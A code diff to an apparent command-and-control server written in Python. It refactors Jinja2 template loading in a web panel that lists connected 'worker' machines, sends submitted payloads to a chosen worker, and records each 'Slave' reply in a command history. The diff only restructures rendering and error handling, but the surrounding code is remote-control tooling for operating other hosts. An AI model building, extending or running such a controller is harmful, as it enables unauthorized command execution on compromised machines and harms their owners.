@@ -2,11 +2,10 @@ from datetime import datetime
 import socket
 import pdb
 import base64
-import urllib.parse
+import jinja2
 from urllib.parse import unquote_plus
 from optparse import OptionParser
 from threading import Thread
-from jinja2 import Template
 import multiprocessing
 
 import utilities
@@ -24,6 +23,8 @@ def parse_cli_args():
 
 opts = parse_cli_args()
 
+templateLoader = jinja2.FileSystemLoader(searchpath="templates")
+templateEnv = jinja2.Environment(loader=templateLoader)
 
 class Client(object):
     """
@@ -104,33 +105,36 @@ while True:
         elif data.startswith('GET / '):
             # payload URLs: POST /b64<payload>?b64<host:port>
             # add payload input field
-            print(f'Web interface Request data: << {data}')
-            with open('templates/index.html') as file_:
-                template = Template(file_.read())
-            # check connections if actual/exclude web conns
+            print(f'Web interface Request data: << GET /index.html')
+            template = templateEnv.get_template('index.html')
             response = template.render(connections=connections)
             connection.sendall(b'HTTP/1.1 200 OK\r\n\r\n')
             connection.send(response.encode('utf-8'))
             connection.close()
-            # continue
         elif data.startswith('GET /favicon'):
             connection.sendall(b'HTTP/1.1 404 Not Found\r\n\r\n')
             connection.close()
         elif data.startswith('GET /worker_'):
-            print(f'Web interface Request data: << {data}')
-            host = data.split()[1][8:] #b64decode after /worker_
-            worker_connection = None
-            for conn in connections:
-                if conn['url'] == host:
-                    worker_connection = conn
-                    break
-            with open('templates/worker.html') as file_:
-                template = Template(file_.read())
-            # check connections if actual/exclude web conns
-            response = template.render(conn=worker_connection, history=worker_connection['history'])
-            connection.sendall(b'HTTP/1.1 200 OK\r\n\r\n')
-            connection.send(response.encode('utf-8'))
-            connection.close()
+            try:
+                host = data.split()[1][8:] #b64decode after /worker_
+                print(f'Web interface Request data: << GET /worker_{host}')
+                worker_connection = None
+                for conn in connections:
+                    if conn['url'] == host:
+                        worker_connection = conn
+                        break
+                template = templateEnv.get_template('worker.html')
+                response = template.render(connections=connections, conn=worker_connection, history=worker_connection['history'])
+                connection.sendall(b'HTTP/1.1 200 OK\r\n\r\n')
+                connection.send(response.encode('utf-8'))
+                connection.close()
+            except Exception as e:
+                template = templateEnv.get_template('error.html')
+                traceback = f'Exception: {e}, Line number: {e.__traceback__.tb_lineno}'
+                response = template.render(traceback=traceback)
+                connection.sendall(b'HTTP/1.1 200 OK\r\n\r\n')
+                connection.send(response.encode('utf-8'))
+                connection.close()
         elif data.startswith('POST /payload_'):
             # encode payload b64
             # payload: POST /b64<host:port>
@@ -151,9 +155,8 @@ while True:
             response_data = worker_connection['conn'].recv(1024).decode('utf-8')
             worker_connection['history'].append(f'>>> {payload}<br/><<< {response_data}')
             print(f'Slave {host} reply: << {response_data}')
-            with open('templates/worker.html') as f:
-                template = Template(f.read())
-            response = template.render(conn=worker_connection, response=response_data, history=worker_connection['history'])
+            template = templateEnv.get_template('worker.html')
+            response = template.render(connections=connections, conn=worker_connection, response=response_data, history=worker_connection['history'])
             connection.sendall(b'HTTP/1.1 200 OK\r\n\r\n')
             connection.send(response.encode('utf-8'))
             connection.close()
